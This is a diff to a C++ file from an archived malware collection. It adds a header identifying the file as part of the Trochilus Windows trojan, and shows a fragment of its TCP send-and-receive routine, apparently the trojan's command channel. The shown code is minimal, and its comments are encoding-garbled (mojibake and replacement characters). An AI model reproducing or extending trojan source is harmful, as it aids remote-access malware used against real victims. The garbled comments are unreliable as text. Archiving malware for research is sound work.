@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "socket/MySocket.h"
 #include "TcpComm.h"
@@ -60,7 +71,7 @@ BOOL TcpComm::SendAndRecv( ULONG targetIP, const LPBYTE pSendData, DWORD dwSendS
 		if (!ret)
 			break;
 
-		//¸´ÖÆÊý¾Ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		*pRecvData = Alloc(recvHead.nSize);
 		memcpy(*pRecvData, (LPBYTE)buffer, recvHead.nSize);
 		dwRecvSize =  recvHead.nSize;
